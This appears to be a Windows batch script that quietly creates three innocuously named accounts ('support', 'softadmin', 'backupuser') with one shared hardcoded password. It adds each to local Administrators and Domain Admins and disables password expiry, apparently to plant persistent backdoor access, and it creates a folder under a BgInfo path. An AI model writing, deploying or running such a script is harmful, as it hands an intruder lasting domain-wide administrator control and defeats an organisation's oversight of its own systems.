@echo off
CD /d "%~dp0"
md "C:\BgInfo\pschng"
net users support saubnc@2020 /add
net users support saubnc@2020 /active:yes
net localgroup Administrators /add support
net group "Domain Admins" /add support
wmic useraccount where name='support' set PasswordExpires=FALSE
wmic useraccount where name='support' set disabled=false

net users softadmin saubnc@2020 /add
net users softadmin saubnc@2020 /active:yes
net localgroup Administrators /add softadmin
net group "Domain Admins" /add softadmin
wmic useraccount where name='softadmin' set PasswordExpires=FALSE
wmic useraccount where name='softadmin' set disabled=false

net users backupuser saubnc@2020 /add
net users backupuser saubnc@2020 /active:yes
net localgroup Administrators /add backupuser
net group "Domain Admins" /add backupuser
wmic useraccount where name='backupuser' set PasswordExpires=FALSE
wmic useraccount where name='backupuser' set disabled=false

@echo on